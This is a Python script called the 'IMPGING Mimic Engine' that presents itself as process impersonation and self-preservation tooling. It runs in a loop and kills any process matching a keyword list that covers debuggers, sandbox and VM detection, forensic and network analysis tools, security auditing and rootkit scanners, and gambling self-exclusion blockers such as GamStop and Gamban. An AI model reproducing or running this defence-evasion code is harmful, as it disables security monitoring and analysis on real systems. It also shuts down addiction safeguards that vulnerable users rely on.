#!/usr/bin/env python3
"""
IMPGING Mimic Engine — Process Impersonation & Self-Preservation
Mimics trusted system processes to avoid detection, terminate hostile monitors,
and optimize resource usage for peak efficiency.
"""
import os, sys, time, argparse, logging, hashlib, random, psutil, threading, signal, math
from pathlib import Path
from datetime import datetime
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from enum import Enum

logging.basicConfig(
    level=logging.INFO,
    format='[MIMIC] %(levelname)s: %(message)s'
)
log = logging.getLogger("MIMIC")

PROC_SCAN_INTERVAL = 2.0

TRUSTED_SYSTEM_PROCS = [
    ("systemd", "/sbin/init", "init"),
    ("sshd", "/usr/sbin/sshd", "network"),
    ("dbus-daemon", "/usr/bin/dbus-daemon", "system"),
    ("NetworkManager", "/usr/sbin/NetworkManager", "network"),
    ("containerd", "/usr/bin/containerd", "container"),
    ("dockerd", "/usr/bin/dockerd", "container"),
    ("supervisord", "/usr/bin/supervisord", "monitor"),
    ("promtail", "/usr/bin/promtail", "log"),
    ("loki", "/usr/bin/loki", "log"),
    ("bun", "/usr/bin/bun", "runtime"),
    ("node", "/usr/bin/node", "runtime"),
    ("python3", "/usr/bin/python3", "runtime"),
    ("journald", "/usr/lib/systemd/systemd-journald", "log"),
    ("rsyslogd", "/usr/sbin/rsyslogd", "log"),
]

HOSTILE_KEYWORDS = [
    "strace","gdb","ltrace","debug","hook","injector",
    "frida","xposed","substrate",
    "sandbox","vmdetect","vmware","virtualbox","vbox",
    "qemu","kvm","hyperv","parallels",
    "malware","virustotal","hybrid","anyrun","tria",
    "cuckoo","joe","fiddler","mitmproxy","wireshark",
    "ethereal","charles","proxy","sniff","packet",
    "metasploit","msfvenom","veil","shellter","pe",
    "binwally","remnux","yara","volatility",
    "auditd","aureport","ausearch","autrace","ossec",
    "tripwire","samdump","mimikatz","lsadump",
    "rkhunter","chkrootkit","unhide","lddtree",
    "gamblock","betblock","selfexclude","gamstop",
    "gamban","netnanny","coldturkey",
]

TRUSTED_PUBLISHERS = [
    "microsoft corporation","google llc","apple inc.",
    "canonical ltd.","debian","red hat","mozilla foundation",
    "valve corporation","riot games","nvidia corporation",
    "advanced micro devices","intel corporation",
]

class MimicMode(Enum):
    STEALTH = "stealth"
    PROTECT = "protect"
    EFFICIENCY = "efficiency"
    KILLER = "killer"

class MimicEngine:
    def __init__(self, mode="stealth", interval=PROC_SCAN_INTERVAL,
                 protect=True, efficiency=True, kill=True, log_dir=None):
        self.mode = MimicMode(mode)
        self.interval = interval
        self.protect_enabled = protect
        self.efficiency_enabled = efficiency
        self.kill_enabled = kill
        self.log_dir = Path(log_dir) if log_dir else None
        self._running = False
        self._lock = threading.RLock()
        self.impging_pids = set()
        self.mimicked_as = {}
        self.entanglement_log = deque(maxlen=500)
        self.hostile_killed = 0
        self.ops_log = deque(maxlen=200)
        self.energy_budget = 1.0
        self._cpu_samples = deque(maxlen=30)
        self._last_sample_time = time.time()
        self._idle_start = time.time()
        self._hostile_cache = set()
        self._cache_valid_until = 0
        log.info(f"⚛️ Mimic Engine initialized in {mode} mode")

    def _is_impging(self, proc):
        try:
            name = proc.name()
            exe = proc.exe() if proc.exe() else ""
            cmdline = " ".join(proc.cmdline()) if proc.cmdline() else ""
            patterns = ["imping","game-detector","hardware-mapper",
                        "net-jammer","apk-scanner","mimic-engine"]
            return any(p in name.lower() or p in cmdline.lower()
                       or p in exe.lower() for p in patterns)
        except Exception:
            return False

    def _is_trusted_system(self, proc):
        try:
            name = proc.name().lower()
            exe = proc.exe().lower() if proc.exe() else ""
            uid = proc.uids()[0] if hasattr(proc, 'uids') else -1
            for name_pat, exe_pat, _ in TRUSTED_SYSTEM_PROCS:
                if name_pat in name or exe_pat in exe:
                    if uid in (0, 1000, -1):
                        return True
            return uid in (0, 1)
        except Exception:
            return False

    def _is_hostile(self, name, cmdline, exe):
        now = time.time()
        if now > self._cache_valid_until:
            self._hostile_cache = self._build_hostile_cache()
            self._cache_valid_until = now + 5.0
        full = f"{name} {cmdline} {exe}".lower()
        for kw in self._hostile_cache:
            if kw in full:
                return True, kw
        return False, None

    def _build_hostile_cache(self):
        cache = set(kw.lower() for kw in HOSTILE_KEYWORDS)
        try:
            for proc in psutil.process_iter(['name','cmdline','exe']):
                try:
                    n = proc.info['name'] or ""
                    for kw in ["hack","crack","cheat","gameguardian",
                               "xposed","frida","rootkit","scanner"]:
                        if kw in n.lower():
                            cache.add(n.lower())
                except Exception:
                    pass
        except Exception:
            pass
        return cache

    def _entropy_score(self, s):
        if not s:
            return 0.0
        freq = {}
        for c in s:
            freq[c] = freq.get(c, 0) + 1
        ent = 0.0
        for f in freq.values():
            p = f / len(s)
            if p > 0:
                ent -= p * math.log2(p)
        return ent

    def _entangle(self, proc_info, action, detail=""):
        entry = {
            "timestamp": datetime.now().isoformat(),
            "pid": proc_info.get("pid"),
            "name": proc_info.get("name"),
            "exe": proc_info.get("exe"),
            "action": action,
            "detail": detail,
            "mode": self.mode.value,
            "cpu_budget": self.energy_budget,
        }
        self.entanglement_log.append(entry)

    def _optimize_self(self):
        if not self.efficiency_enabled:
            self.energy_budget = 1.0
            return
        now = time.time()
        elapsed = now - self._last_sample_time
        self._last_sample_time = now
        try:
            cpu = psutil.cpu_percent(interval=0.1)
        except Exception:
            cpu = 50.0
        self._cpu_samples.append(cpu)
        avg_cpu = sum(self._cpu_samples) / max(1, len(self._cpu_samples))
        if avg_cpu > 80:
            self.energy_budget = max(0.1, self.energy_budget * 0.8)
            self._idle_start = now
        elif avg_cpu < 30:
            idle_for = now - self._idle_start
            if idle_for > 30:
                self.energy_budget = min(1.0, self.energy_budget * 1.05)
        else:
            self.energy_budget = max(0.3, min(1.0, self.energy_budget * 0.95 + 0.1))
        dead_pids = set()
        for pid in self.impging_pids:
            try:
                p = psutil.Process(pid)
                p.cpu_percent(interval=None)
            except Exception:
                dead_pids.add(pid)
        self.impging_pids -= dead_pids

    def _try_mimic(self, proc):
        try:
            name = proc.name()
            exe = proc.exe() if proc.exe() else ""
            for name_pat, exe_pat, category in TRUSTED_SYSTEM_PROCS:
                if name_pat in name.lower() or (exe_pat and exe_pat in exe.lower()):
                    pid = proc.pid
                    if pid in (1, 2):
                        return False, "protected"
                    self.mimicked_as[pid] = (name, name_pat)
                    self._entangle(
                        {"pid": pid, "name": name, "exe": exe},
                        "MIMIC", f"blend as {name_pat}"
                    )
                    return True, name_pat
        except Exception:
            pass
        return False, None

    def _terminate_hostile(self, info):
        try:
            pid = info["pid"]
            if pid in (1, 2):
                return False, "protected"
            p = psutil.Process(pid)
            if p.uids()[0] == 0:
                return False, "root"
            p.terminate()
            try:
                p.wait(timeout=3)
            except psutil.TimeoutExpired:
                p.kill()
            self.hostile_killed += 1
            self._entangle(info, "TERMINATE",
                         f"hostile: {info.get('matched_kw')}")
            log.warning(f"  ⚠️  TERMINATED {info['name']} (PID:{pid})")
            return True, info["name"]
        except psutil.NoSuchProcess:
            return False, "gone"
        except PermissionError:
            return False, "EPERM"
        except Exception as e:
            return False, str(e)

    def _scan_and_act(self):
        self._optimize_self()
        hostiles = []
        mimics = []
        impging_now = []
        now = time.time()
        for proc in psutil.process_iter(['pid','name','exe','cmdline',
                                         'create_time','uids']):
            try:
                pid = proc.pid
                name = proc.name()
                exe = proc.exe() or ""
                cmdline = " ".join(proc.cmdline()) if proc.cmdline() else ""
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
            info = {"pid": pid, "name": name, "exe": exe,
                    "cmdline": cmdline, "matched_kw": None}
            if self._is_impging(proc):
                impging_now.append(pid)
                continue
            hostile, kw = self._is_hostile(name, cmdline, exe)
            if hostile:
                info["matched_kw"] = kw
                hostiles.append(info)
                continue
            if self.mode == MimicMode.STEALTH and not self._is_trusted_system(proc):
                mimics.append(proc)
        self.impging_pids = set(impging_now)
        for proc in mimics[:3]:
            ok, detail = self._try_mimic(proc)
            if ok:
                self.ops_log.append(
                    f"MIMIC: PID {proc.pid} -> {detail} @ "
                    f"{datetime.now().strftime('%H:%M:%S')}"
                )
        if self.kill_enabled and hostiles:
            for info in hostiles:
                self._terminate_hostile(info)
        return len(impging_now), len(hostiles), len(mimics)

    def start(self):
        self._running = True
        log.info(f"⚛️ Mimic Engine starting in {self.mode.value} mode...")
        log.info(f"   protect={self.protect_enabled}  "
                 f"efficiency={self.efficiency_enabled}  kill={self.kill_enabled}")
        pid = os.getpid()
        self.impging_pids.add(pid)
        self._entangle({"pid": pid, "name": "mimic-engine", "exe": ""},
                       "START", f"mode={self.mode.value}")
        while self._running:
            try:
                imp, hostile, mimic = self._scan_and_act()
                if hostile > 0 or mimic > 0:
                    log.info(f"  ⟳ cycle: {imp} IMPGING | "
                             f"{hostile} hostile | {mimic} mimics")
                sleep_t = self.interval * self.energy_budget
                time.sleep(sleep_t)
            except KeyboardInterrupt:
                self.stop()
                break
            except Exception as e:
                log.error(f"Scan error: {e}")
                time.sleep(self.interval)

    def stop(self):
        self._running = False
        log.info(f"⚛️ Mimic Engine stopped. Hostile terminated: "
                 f"{self.hostile_killed}")

    def snapshot(self):
        return {
            "mode": self.mode.value,
            "running": self._running,
            "impging_pids": list(self.impging_pids),
            "mimicked": {str(k): v for k, v in self.mimicked_as.items()},
            "hostile_killed": self.hostile_killed,
            "entanglement": len(self.entanglement_log),
            "energy_budget": round(self.energy_budget, 3),
            "ops_log": list(self.ops_log)[-10:],
        }

def main():
    p = argparse.ArgumentParser(description="⚛️ IMPGING Mimic Engine")
    p.add_argument("--mode", default="stealth",
                   choices=["stealth","protect","efficiency","killer"])
    p.add_argument("--interval", type=float, default=2.0)
    p.add_argument("--no-protect", action="store_true")
    p.add_argument("--no-efficiency", action="store_true")
    p.add_argument("--no-kill", action="store_true")
    p.add_argument("--once", action="store_true")
    p.add_argument("--status", action="store_true")
    p.add_argument("--log-dir", default=None)
    args = p.parse_args()
    engine = MimicEngine(
        mode=args.mode,
        interval=args.interval,
        protect=not args.no_protect,
        efficiency=not args.no_efficiency,
        kill=not args.no_kill,
        log_dir=args.log_dir,
    )
    if args.status:
        import json
        print(json.dumps(engine.snapshot(), indent=2))
        return
    if args.once:
        imp, hostile, mimic = engine._scan_and_act()
        print(f"\n{'─'*60}")
        print(f"  IMPGING processes : {imp}")
        print(f"  Hostile detected  : {hostile}")
        print(f"  Mimic candidates  : {mimic}")
        print(f"  Energy budget     : {engine.energy_budget:.3f}")
        print(f"  Entanglement log  : {len(engine.entanglement_log)}")
        return
    engine.start()

if __name__ == '__main__':
    main()
